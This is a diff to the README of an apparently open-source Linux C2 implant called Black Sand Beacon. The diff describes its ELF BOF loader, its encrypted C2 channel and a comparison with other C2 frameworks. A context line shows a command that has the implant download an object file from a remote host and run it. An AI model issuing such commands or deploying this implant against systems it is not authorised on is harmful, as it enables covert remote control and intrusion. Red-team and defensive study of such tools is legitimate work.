@@ -9,7 +9,35 @@ Black Sand Beacon — a lightweight, memory-resident micro beacon or implant for
 - Bof Execution
   - issue_command_to_c2 linux bof:https://10.10.14.57/whoami.x64.o
 
+## Linux ELF BOF Loader - First Native C Implementation
 
+**Background**: After implementing COFFLoader3 (Windows COFF with DJB2 hashing) 
+and BlackBasalt C2, this represents the first fully native C implementation 
+of a Cobalt Strike-style beacon for Linux with complete ELF BOF support.
+
+## Key Features
+- ✅ Native C (no Go/Rust runtime)
+- ✅ Full ELF relocation support (R_X86_64_64/32/PC32/PLT32)
+- ✅ Automatic trampoline generation for long jumps
+- ✅ System V ABI compliant (variadic function support)
+- ✅ Beacon API compatible (BeaconPrintf, BeaconOutput)
+- ✅ AES-256-CFB encrypted C2 communication
+
+## Technical Innovations
+1. **Trampoline Cache System**: Solves Linux address space challenges
+2. **Stack Alignment**: Proper handling of movaps/variadic functions
+3. **Symbol Resolution**: Dynamic symbol table with fallback
+
+## Credits
+- Inspired by TrustedSec's COFFLoader (Windows)
+- Built upon experience with COFFLoader3 and BlackBasalt beacon
+
+## Comparison
+| Feature | This Project | Sliver | Mythic | CrossC2 |
+|---------|--------------|--------|--------|---------|
+| Language | C (native) | Go | Rust | Closed |
+| Open Source | ✅ | ✅ | ✅ | ❌ |
+| Standalone | ✅ | ✅ | ✅ | Needs CS |
 
 ## 📱 System Architecture
 Black Sand Beacon is a modular C2 agent with a layered architecture consisting of:
